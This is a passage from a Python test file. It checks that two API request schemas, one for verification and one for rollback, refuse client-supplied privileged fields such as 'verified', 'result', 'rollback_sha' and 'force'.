# ── API surface: authority fields are structurally impossible ────────


class TestApiAuthorityRejection:
    def test_verification_request_rejects_authority_fields(self):
        from app.schemas import VerificationStartRequest
        import pydantic
        with pytest.raises(pydantic.ValidationError):
            VerificationStartRequest.model_validate({"verified": True})
        with pytest.raises(pydantic.ValidationError):
            VerificationStartRequest.model_validate({"result": "PASS"})
        with pytest.raises(pydantic.ValidationError):
            VerificationStartRequest.model_validate({"plan": {}})

    def test_rollback_request_rejects_authority_fields(self):
        from app.schemas import RollbackStartRequest
        import pydantic
        with pytest.raises(pydantic.ValidationError):
            RollbackStartRequest.model_validate({"rollback_sha": "a" * 40})
        with pytest.raises(pydantic.ValidationError):
            RollbackStartRequest.model_validate({"rollback": True})
        with pytest.raises(pydantic.ValidationError):
            RollbackStartRequest.model_validate({"force": True})
